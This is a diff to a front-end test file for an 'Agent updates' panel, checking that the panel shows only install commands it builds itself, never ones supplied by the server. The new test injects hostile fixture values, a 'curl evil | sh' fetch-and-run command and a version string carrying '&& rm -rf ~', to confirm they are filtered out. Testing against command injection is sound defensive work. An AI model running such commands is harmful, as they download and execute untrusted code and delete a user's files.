@@ -8,8 +8,8 @@ import { AgentUpdates } from "./AgentUpdates.js";
 
 /** Agent updates (change record agent-update-prompt, AU-07). */
 
-const grok = { agent: "grok", name: "Grok CLI", installed: "1.0.77", latest: "1.0.92", command: ["npm", "install", "--global", "@xai-official/grok@1.0.92"] };
-const opencode = { agent: "opencode", name: "OpenCode", installed: "1.19.5", latest: "1.19.6", command: ["npm", "install", "--global", "opencode-ai@1.19.6"] };
+const grok = { agent: "grok", name: "Grok CLI", installed: "1.0.77", latest: "1.0.92", npm_global: true };
+const opencode = { agent: "opencode", name: "OpenCode", installed: "1.19.5", latest: "1.19.6", npm_global: true };
 const brew = { agent: "codex", name: "Codex CLI", installed: "0.170.0", latest: "0.171.0", note: "installed outside npm (/opt/homebrew/bin/codex); update it with the tool you installed it with" };
 
 describe("Agent updates", () => {
@@ -65,9 +65,25 @@ describe("Agent updates", () => {
     await waitFor(() => expect(screen.queryByRole("region")).toBeNull());
     unmount();
     // A newer version of a dismissed agent shows again.
-    updates = [{ ...grok, latest: "1.0.93", command: ["npm", "install", "--global", "@xai-official/grok@1.0.93"] }];
+    updates = [{ ...grok, latest: "1.0.93" }];
     await renderPage(<AgentUpdates />);
     expect(await screen.findByRole("region", { name: "1 agent update" })).toBeTruthy();
+  });
+
+  it("never shows or copies command text from the response, only the one it builds", async () => {
+    updates = [
+      { ...grok, command: ["sh", "-c", "curl evil | sh"] },
+      { agent: "opencode", name: "OpenCode", installed: "1.19.5", latest: "1.19.6 && rm -rf ~", npm_global: true },
+      { agent: "agy", name: "Antigravity CLI", installed: "1.0.0", latest: "1.1.0", npm_global: true },
+    ];
+    await renderPage(<AgentUpdates />);
+    // The entry with a version that is not SemVer is not shown at all.
+    const panel = await screen.findByRole("region", { name: "2 agent updates" });
+    expect(panel.textContent).not.toContain("curl evil");
+    expect(panel.textContent).not.toContain("rm -rf");
+    expect(within(panel).getByText("Grok CLI").closest("li")!.textContent).toContain("npm install --global @xai-official/grok@1.0.92");
+    expect(within(panel).queryByText("OpenCode")).toBeNull();
+    expect(within(within(panel).getByText("Antigravity CLI").closest("li")!).queryByRole("button", { name: "Copy command" })).toBeNull();
   });
 
   it("shows nothing when every agent is current", async () => {
